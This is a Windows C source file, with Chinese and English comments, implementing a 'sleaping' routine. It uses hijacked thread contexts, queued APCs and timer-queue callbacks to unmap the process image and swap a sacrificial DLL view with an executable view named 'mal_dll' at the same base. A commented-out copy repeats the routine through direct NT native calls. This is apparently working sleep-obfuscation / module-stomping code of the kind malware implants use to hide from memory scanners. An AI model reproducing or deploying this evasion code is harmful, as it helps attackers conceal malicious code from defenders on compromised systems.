#include "pch.h"
#include <Windows.h>
#include "headers.h"
#include "types.h"
#include "sleaping.h"


BOOLEAN AllocateStack(HANDLE hProcess, ULONG_PTR target_addr) {
    MEMORY_BASIC_INFORMATION mbi;
    int status = 0;


    target_addr &= ~((UINT64)0xfff);

    // 1. 查询目标地址的内存状态
    if (VirtualQueryEx(hProcess, (LPCVOID)target_addr, &mbi, sizeof(mbi)) == 0) {
        return FALSE;
    }

    // 2. 如果页面未提交 (MEM_RESERVE) 或 是保护页 (PAGE_GUARD)
    // 或者是只读页面，我们需要尝试修复它
    if (mbi.State != MEM_COMMIT || (mbi.Protect & PAGE_GUARD) || !(mbi.Protect & PAGE_READWRITE)) {

        // 尝试提交该内存页。对于栈预留空间，VirtualAlloc 会将其转为 MEM_COMMIT
        // 如果该地址完全非法（不在栈预留范围内），此操作会失败
        if (!VirtualAllocEx(hProcess, (LPVOID)target_addr, 0x1000, MEM_COMMIT, PAGE_READWRITE)) {

            // 如果 VirtualAlloc 失败，尝试最后的手段：修改保护属性
            DWORD oldProtect;
            if (!VirtualProtectEx(hProcess, (LPVOID)target_addr, 0x1000, PAGE_READWRITE, &oldProtect)) {
                return FALSE; // 彻底无法写入
            }
        }
    }

    return TRUE;
}


VOID CALLBACK ResumeThreadCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired)
{
    HANDLE hThread = (HANDLE)lpParameter;
    ResumeThread(hThread);
}

/*
Main thread
    |
    +-- Initialization phase (0-several ms)
    |    +-- Create event object
    |    +-- Allocate CONTEXT memory
    |    +-- Create thread 2 (suspended state)
    |
    +-- Configure thread 2
    |    +-- Get thread context
    |    +-- Modify to WaitForSingleObjectEx(NtTestAlert returns)
    |    +-- Resume thread 2 execution
    |
    +-- Create other threads
    |    +-- CreateThread0 (suspended): UnmapViewOfFile
    |    +-- CreateThread1 (suspended): MapViewOfFileEx(sac_dll)
    |    +-- CreateThread3 (suspended): MapViewOfFileEx(mal_dll)
    |
    +-- Configure thread context
    |    +-- Thread 0: UnmapViewOfFile(image_base)
    |    +-- Thread 1: MapViewOfFileEx(sac_dll->image_base)
    |    +-- Thread 3: MapViewOfFileEx(mal_dll->image_base)
    |
    +-- Create timer queue
    |
    +-- Set APC queue (thread 2)
    |    +-- APC1: UnmapViewOfFile(image_base)
    |    +-- APC2: ResumeThread (Thread 3)
    |    +-- APC3: ExitThread (thread 2 itself)
    |
    +-- Set timer
    |    +-- Timer 1 (200ms): ResumeThread (Thread 0)
    |    +-- Timer 2 (300ms): ResumeThread (Thread 1)
    |
    +-- Wait for all threads to complete
*/
status_t sleaping(sleaping_para_t* para)
{

    PVOID image_base = para->image_base;
    HANDLE sac_dll_handle = para->sac_dll_handle;
    HANDLE mal_dll_handle = para->mal_dll_handle;
    SIZE_T view_size = para->view_size;
    PNT_FUNCTIONS nt_func_s = para->nt;

    HANDLE dummy_event = { 0 };
    HANDLE thread_array[4] = { NULL };

    HANDLE timer_queue = NULL;

    HANDLE timer_unmap = NULL;
    HANDLE timer_map = NULL;

    int status = ST_SUCCESS;
    void** buggy = 0;

    // create a manual sync event to sync threads
    if (!NT_SUCCESS(nt_func_s->NtCreateEvent(&dummy_event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)))
    {
        return ST_ERROR;
    }

    // allocate thread context 
    CONTEXT* context_0 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_1 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_2 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_3 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    if (context_0 == NULL
        || context_1 == NULL
        || context_2 == NULL
        || context_3 == NULL
        )
    {
        status = ST_ERROR;
        goto __clean_up_event;
    }

    context_0->ContextFlags = CONTEXT_ALL;
    context_1->ContextFlags = CONTEXT_ALL;
    context_2->ContextFlags = CONTEXT_ALL;
    context_3->ContextFlags = CONTEXT_ALL;


    // create a suspended waiting thread.
    thread_array[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
    if (thread_array[2] == NULL)
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }

    // get the context of the waiting thread.
    if (!GetThreadContext(thread_array[2], context_2))
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }

    // Set up thread context to call WaitForSingleObjectEx with NtTestAlert on stack
    *(ULONG_PTR*)((*context_2).Rsp) = (DWORD64)nt_func_s->NtTestAlert;
    (*context_2).Rip = (DWORD64)WaitForSingleObjectEx;
    (*context_2).Rcx = (DWORD64)(dummy_event);
    (*context_2).Rdx = (DWORD64)21000;         // 21 second timeout
    (*context_2).R8 = FALSE;


    if (!SetThreadContext(thread_array[2], context_2))
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }

    // wait + APCs
    // resume the thread that is going to wait the sleep time and then execute the APCs
    if (!ResumeThread(thread_array[2]))
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }

    // Create suspend threads for memory  operations.
    thread_array[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    thread_array[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    thread_array[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);

    //*buggy = MapViewOfFileEx;

    if (thread_array[0] == NULL || thread_array[1] == NULL || thread_array[3] == NULL)
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }

    if (!GetThreadContext(thread_array[0], context_0) ||
        !GetThreadContext(thread_array[1], context_1) ||
        !GetThreadContext(thread_array[3], context_3))
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }


    // Configure thread 0 for UnmapViewOfFile
    *(ULONG_PTR*)((*context_0).Rsp) = (DWORD64)(ExitThread);
    (*context_0).Rip = (DWORD64)UnmapViewOfFile;
    (*context_0).Rcx = (DWORD64)(image_base);

    // Configure thread 1 for MapViewOfFileEx (sac_dll)
    *(ULONG_PTR*)((*context_1).Rsp) = (DWORD64)(ExitThread);
    (*context_1).Rip = (DWORD64)MapViewOfFileEx;
    (*context_1).Rcx = (DWORD64)sac_dll_handle;
    (*context_1).Rdx = FILE_MAP_ALL_ACCESS;
    (*context_1).R8 = (DWORD64)0x0;
    (*context_1).R9 = (DWORD64)0x0;

    // the offset must be the either hex 28 or int 40
    // (5th argument, 6th argument


    /*
	  跨页监测
      此时，context_3->Rsp 的值可能正好就在内存页的边缘（例如 0x3C2E8FFFF8）。
      加上 40 字节时，计算出的地址变成了 0x0000003C2E900000。
      这个地址 ...900000 可能尚未分配，或者是一个不可写的保护页（Guard Page）。
      由于代码强行进行写入操作，CPU 触发了 EXCEPTION_ACCESS_VIOLATION。
    */
    if (((context_1->Rsp + 40) >> 0xC ) > (context_1->Rsp >> 0xC) || ((context_1->Rsp + 48) >> 0xC ) > (context_1->Rsp >> 0xC))
		if (AllocateStack(((HANDLE)(LONG_PTR)-1), context_1->Rsp + 40) == FALSE)
		{
			status = ST_ERROR;
			goto __clean_up_context;
		}

    
    *(ULONG_PTR*)((*context_1).Rsp + 40) = 0x0;
    *(ULONG_PTR*)((*context_1).Rsp + 48) = (ULONG_PTR)image_base;
    

    // Configure thread 3 for MapViewOfFileEx (mal_dll)
    *(ULONG_PTR*)((*context_3).Rsp) = (DWORD64)ExitThread;
    (*context_3).Rip = (DWORD64)MapViewOfFileEx;
    (*context_3).Rcx = (DWORD64)mal_dll_handle;
    (*context_3).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*context_3).R8 = (DWORD64)0x00;
    (*context_3).R9 = (DWORD64)0x00;


    if (((context_3->Rsp + 40) >> 0xC ) > (context_3->Rsp >> 0xC) || ((context_3->Rsp + 48) >> 0xC ) > (context_3->Rsp >> 0xC))
		if (AllocateStack(((HANDLE)(LONG_PTR)-1), context_3->Rsp + 40) == FALSE)
		{
			status = ST_ERROR;
			goto __clean_up_context;
		}

    // the offset must be the either hex 28 or int 40
    *(ULONG_PTR*)((*context_3).Rsp + 40) = 0x0;
    *(ULONG_PTR*)((*context_3).Rsp + 48) = (ULONG_PTR)image_base;


    if (!SetThreadContext(thread_array[0], context_0) ||
        !SetThreadContext(thread_array[1], context_1) ||
        !SetThreadContext(thread_array[3], context_3))
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }



    timer_queue = CreateTimerQueue();
    if (timer_queue == NULL)
    {
        status = ST_ERROR;
        goto __clean_up_context;
    }

    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)UnmapViewOfFile, image_base, FALSE, NULL)))
    {
        status = ST_ERROR;
        goto __clean_up_timer;
    }
    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ResumeThread, thread_array[3], FALSE, NULL)))
    {
        status = ST_ERROR;
        goto __clean_up_timer;
    }
    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL)))
    {
        status = ST_ERROR;
        goto __clean_up_timer;
    }

    // unmap
    if (!CreateTimerQueueTimer(&timer_unmap, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[0], 200, 0, WT_EXECUTEINTIMERTHREAD))
    {
        status = ST_ERROR;
        goto __clean_up_timer;
    }

    // map
    if (!CreateTimerQueueTimer(&timer_map, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[1], 300, 0, WT_EXECUTEINTIMERTHREAD))
    {
        status = ST_ERROR;
        goto __clean_up_timer;
    }


    if (WaitForMultipleObjects(4, thread_array, TRUE, INFINITE) == WAIT_FAILED)
    {
        status = ST_ERROR;
        goto __clean_up_timer;
    }


__clean_up_timer:
    if (timer_map != NULL)
        DeleteTimerQueueTimer(timer_queue, timer_map, NULL);
    if (timer_unmap != NULL)
        DeleteTimerQueueTimer(timer_queue, timer_unmap, NULL);

    DeleteTimerQueue(timer_queue);

__clean_up_context:
    if (context_0) VirtualFree(context_0, 0, MEM_RELEASE);
    if (context_1) VirtualFree(context_1, 0, MEM_RELEASE);
    if (context_2) VirtualFree(context_2, 0, MEM_RELEASE);
    if (context_3) VirtualFree(context_3, 0, MEM_RELEASE);

__clean_up_event:
    if (dummy_event) CloseHandle(dummy_event);


    return status;
}
//status_t sleaping(sleaping_para_t* para)
//{
//
//    PVOID image_base = para->image_base;
//    HANDLE sac_dll_handle = para->sac_dll_handle;
//    HANDLE mal_dll_handle = para->mal_dll_handle;
//    SIZE_T view_size = para->view_size;
//    PNT_FUNCTIONS nt = para->nt;
//
//    HANDLE dummy_event = { 0 };
//    HANDLE thread_array[4] = { NULL };
//
//    HANDLE timer_queue = NULL;
//
//    HANDLE timer_unmap = NULL;
//    HANDLE timer_map = NULL;
//
//	void** buggy = 0;
//
//    int status = ST_SUCCESS;
//
//    // create a manual sync event to sync threads
//    if (!NT_SUCCESS(nt->NtCreateEvent(&dummy_event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)))
//    {
//        return ST_ERROR;
//    }
//
//    // allocate thread context 
//    PVOID base0 = NULL;
//    SIZE_T size0 = sizeof(CONTEXT);
//    nt->NtAllocateVirtualMemory(((HANDLE)(LONG_PTR)-1), &base0, 0, &size0, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//    CONTEXT* context_0 = (CONTEXT*)base0;
//
//    PVOID base1 = NULL;
//    SIZE_T size1 = sizeof(CONTEXT);
//    nt->NtAllocateVirtualMemory(((HANDLE)(LONG_PTR)-1), &base1, 0, &size1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//    CONTEXT* context_1 = (CONTEXT*)base1;
//
//    PVOID base2 = NULL;
//    SIZE_T size2 = sizeof(CONTEXT);
//    nt->NtAllocateVirtualMemory(((HANDLE)(LONG_PTR)-1), &base2, 0, &size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//    CONTEXT* context_2 = (CONTEXT*)base2;
//
//    PVOID base3 = NULL;
//    SIZE_T size3 = sizeof(CONTEXT);
//    nt->NtAllocateVirtualMemory(((HANDLE)(LONG_PTR)-1), &base3, 0, &size3, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//    CONTEXT* context_3 = (CONTEXT*)base3;
//    // CONTEXT* context_0 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
//    // CONTEXT* context_1 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
//    // CONTEXT* context_2 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
//    // CONTEXT* context_3 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
//
//
//    if (context_0 == NULL
//        || context_1 == NULL
//        || context_2 == NULL
//        || context_3 == NULL
//        )
//    {
//        status = ST_ERROR;
//        goto __clean_up_event;
//    }
//
//
//    context_0->ContextFlags = CONTEXT_ALL;
//    context_1->ContextFlags = CONTEXT_ALL;
//    context_2->ContextFlags = CONTEXT_ALL;
//    context_3->ContextFlags = CONTEXT_ALL;
//
//
//    // create a suspended waiting thread.
//
//    nt->NtCreateThreadEx(&thread_array[2], THREAD_ALL_ACCESS, NULL, ((HANDLE)(LONG_PTR)-1),
//                    (PUSER_THREAD_START_ROUTINE)WaitForSingleObjectEx, NULL,
//                    CREATE_SUSPENDED, 0, 0, 0, NULL);
//
//    // thread_array[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
//    if (thread_array[2] == NULL)
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//
//    // get the context of the waiting thread.
//    if (!NT_SUCCESS(nt->NtGetContextThread(thread_array[2], context_2)))
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//
//    // Set up thread context to call WaitForSingleObjectEx with NtTestAlert on stack
//    *(ULONG_PTR*)((*context_2).Rsp) = (DWORD64)nt->NtTestAlert;
//    (*context_2).Rip = (DWORD64)WaitForSingleObjectEx;
//    (*context_2).Rcx = (DWORD64)(dummy_event);
//    (*context_2).Rdx = (DWORD64)21000;         // 21 second timeout
//    (*context_2).R8 = FALSE;
//
//
//    if (!NT_SUCCESS(nt->NtSetContextThread(thread_array[2], context_2)))
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//
//    // wait + APCs
//    // resume the thread that is going to wait the sleep time and then execute the APCs
//    if (!NT_SUCCESS(nt->NtResumeThread(thread_array[2], NULL)))
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//    // Create suspend threads for memory  operations.
//    nt->NtCreateThreadEx(&thread_array[0], THREAD_ALL_ACCESS, NULL, ((HANDLE)(LONG_PTR)-1), (PUSER_THREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, 0, 0, 0, NULL);
//    nt->NtCreateThreadEx(&thread_array[1], THREAD_ALL_ACCESS, NULL, ((HANDLE)(LONG_PTR)-1), (PUSER_THREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, 0, 0, 0, NULL);
//    nt->NtCreateThreadEx(&thread_array[3], THREAD_ALL_ACCESS, NULL, ((HANDLE)(LONG_PTR)-1), (PUSER_THREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, 0, 0, 0, NULL);
//    //thread_array[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
//    //thread_array[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
//    //thread_array[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
//
//    //*buggy = MapViewOfFileEx;
//
//    if (thread_array[0] == NULL || thread_array[1] == NULL || thread_array[3] == NULL)
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//    if (!NT_SUCCESS(nt->NtGetContextThread(thread_array[0], context_0)) ||
//        !NT_SUCCESS(nt->NtGetContextThread(thread_array[1], context_1)) ||
//        !NT_SUCCESS(nt->NtGetContextThread(thread_array[3], context_3)) )
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//
//    // Configure thread 0 for UnmapViewOfFile
//    *(ULONG_PTR*)((*context_0).Rsp) = (DWORD64)(ExitThread);
//    (*context_0).Rip = (DWORD64)UnmapViewOfFile;
//    (*context_0).Rcx = (DWORD64)(image_base);
//
//    // Configure thread 1 for MapViewOfFileEx (sac_dll)
//    *(ULONG_PTR*)((*context_1).Rsp) = (DWORD64)(ExitThread);
//    (*context_1).Rip = (DWORD64)MapViewOfFileEx;
//    (*context_1).Rcx = (DWORD64)sac_dll_handle;
//    (*context_1).Rdx = FILE_MAP_ALL_ACCESS;
//    (*context_1).R8 = (DWORD64)0x0;
//    (*context_1).R9 = (DWORD64)0x0;
//
//    // the offset must be the either hex 28 or int 40
//    // (5th argument, 6th argument
//    *(ULONG_PTR*)((*context_1).Rsp + 40) = 0x0;
//    *(ULONG_PTR*)((*context_1).Rsp + 48) = (ULONG_PTR)image_base;
//
//
//    // Configure thread 3 for MapViewOfFileEx (mal_dll)
//    *(ULONG_PTR*)((*context_3).Rsp) = (DWORD64)ExitThread;
//    (*context_3).Rip = (DWORD64)MapViewOfFileEx;
//    (*context_3).Rcx = (DWORD64)mal_dll_handle;
//    (*context_3).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
//    (*context_3).R8 = (DWORD64)0x00;
//    (*context_3).R9 = (DWORD64)0x00;
//
//    // the offset must be the either hex 28 or int 40
//    *(ULONG_PTR*)((*context_3).Rsp + 40) = 0x0;
//    *(ULONG_PTR*)((*context_3).Rsp + 48) = (ULONG_PTR)image_base;
//
//
//    if (!NT_SUCCESS(nt->NtSetContextThread(thread_array[0], context_0)) ||
//        !NT_SUCCESS(nt->NtSetContextThread(thread_array[1], context_1)) ||
//        !NT_SUCCESS(nt->NtSetContextThread(thread_array[3], context_3)))
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//
//
//    timer_queue = CreateTimerQueue();
//    if (timer_queue == NULL)
//    {
//        status = ST_ERROR;
//        goto __clean_up_context;
//    }
//
//    if (!NT_SUCCESS(nt->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)UnmapViewOfFile, image_base, FALSE, NULL)))
//    {
//        status = ST_ERROR;
//        goto __clean_up_timer;
//    }
//    if (!NT_SUCCESS(nt->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ResumeThread, thread_array[3], FALSE, NULL)))
//    {
//        status = ST_ERROR;
//        goto __clean_up_timer;
//    }
//    if (!NT_SUCCESS(nt->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL)))
//    {
//        status = ST_ERROR;
//        goto __clean_up_timer;
//    }
//
//    // unmap
//    if (!CreateTimerQueueTimer(&timer_unmap, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[0], 200, 0, WT_EXECUTEINTIMERTHREAD))
//    {
//        status = ST_ERROR;
//        goto __clean_up_timer;
//    }
//
//    // map
//    if (!CreateTimerQueueTimer(&timer_map, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[1], 300, 0, WT_EXECUTEINTIMERTHREAD))
//    {
//        status = ST_ERROR;
//        goto __clean_up_timer;
//    }
//
//
//    if (WaitForMultipleObjects(4, thread_array, TRUE, INFINITE) == WAIT_FAILED)
//    {
//        status = ST_ERROR;
//        goto __clean_up_timer;
//    }
//
//
//__clean_up_timer:
//    if (timer_map != NULL)
//        DeleteTimerQueueTimer(timer_queue, timer_map, NULL);
//    if (timer_unmap != NULL)
//        DeleteTimerQueueTimer(timer_queue, timer_unmap, NULL);
//
//    DeleteTimerQueue(timer_queue);
//
//__clean_up_context:
//    if (context_0) VirtualFree(context_0, 0, MEM_RELEASE);
//    if (context_1) VirtualFree(context_1, 0, MEM_RELEASE);
//    if (context_2) VirtualFree(context_2, 0, MEM_RELEASE);
//    if (context_3) VirtualFree(context_3, 0, MEM_RELEASE);
//
//__clean_up_event:
//    if (dummy_event) CloseHandle(dummy_event);
//
//
//    return status;
//}

